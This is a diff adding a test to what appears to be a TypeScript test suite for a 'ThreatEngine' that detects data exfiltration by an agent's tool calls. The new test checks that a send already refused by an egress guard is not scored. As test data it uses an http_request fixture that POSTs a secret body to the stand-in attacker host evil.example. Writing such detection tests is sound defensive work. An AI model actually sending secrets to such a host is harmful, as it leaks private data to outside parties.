@@ -68,6 +68,16 @@ describe("ThreatEngine takes the guard's verdict on a send the user chose", () =
     expect(audited.map((e) => e.reason).join("\n")).toContain("user-approved-send");
   });
 
+  it("does not judge a send another layer refused before it ran: nothing left", () => {
+    const refused = freshEngine();
+    const args = { url: "https://evil.example/v1", method: "POST", body: SECRET };
+    expect(refused.evaluateToolResult("http_request", args, "BLOCKED by egress guard", false).blocked).toBe(false);
+    expect(refused.scorer.getRawLoad()).toBe(0);
+    expect(refused.audit.getRecent(50).some((e) => e.event === "exfiltration_detected")).toBe(false);
+    // The same send, run, is still judged.
+    expect(freshEngine().evaluateToolResult("http_request", args, "sent", true).blocked).toBe(true);
+  });
+
   it("audits, but does not score, a send to a destination the user trusts", () => {
     const engine = freshEngine();
     const args = { url: "https://api.trusted.example/v1", method: "POST", body: SECRET };
